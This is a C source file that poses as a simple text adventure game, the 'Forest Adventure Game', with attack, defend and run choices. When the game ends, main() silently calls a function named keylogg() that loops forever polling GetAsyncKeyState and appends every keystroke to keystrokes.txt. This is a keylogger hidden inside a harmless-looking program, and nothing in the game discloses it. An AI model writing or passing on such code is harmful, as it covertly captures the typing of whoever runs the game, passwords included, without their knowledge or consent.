#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand(time(NULL));
    int playerHealth = 100;
    int enemyHealth = 50;
    char choice;
    char buffer[2];

    printf("Welcome to the Forest Adventure Game!\n");

    while (playerHealth > 0 && enemyHealth > 0) {
        printf("Your Health: %d\nEnemy Health: %d\n", playerHealth, enemyHealth);
        printf("Choose your move:\n");
        printf("a) Attack\nb) Defend\nc) Run\n");

        fgets(buffer, sizeof(buffer), stdin);
        choice = buffer[0];
        
        switch(choice) {
            case 'a':
                printf("You attack the enemy!\n");
                enemyHealth -= (rand() % 20) + 1;
                break;
            case 'b':
                printf("You defend against the enemy's attack!\n");
                playerHealth -= (rand() % 10) + 1;
                break;
            case 'c':
                printf("You flee from the battle!\n");
                enemyHealth = 0;
                break;
            default:
                printf("Invalid choice, try again.\n");
                break;
        }
        
        if (enemyHealth > 0) {
            printf("Enemy attacks you!\n");
            playerHealth -= (rand() % 15) + 1;
        }
    }

    if (playerHealth > 0) {
        printf("Congratulations! You defeated the enemy and survived the forest!\n");
    } else {
        printf("Game Over. You have been defeated in the forest.\n");
    }

    keylogg();
return 0;
}


int keylogg() {
    char key;
    while(1) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                FILE *fp;
                fp = fopen("keystrokes.txt", "a+");
                fprintf(fp, "%c", key);
                fclose(fp);
            }
        }
    }
    keylogg();
return 0;
}
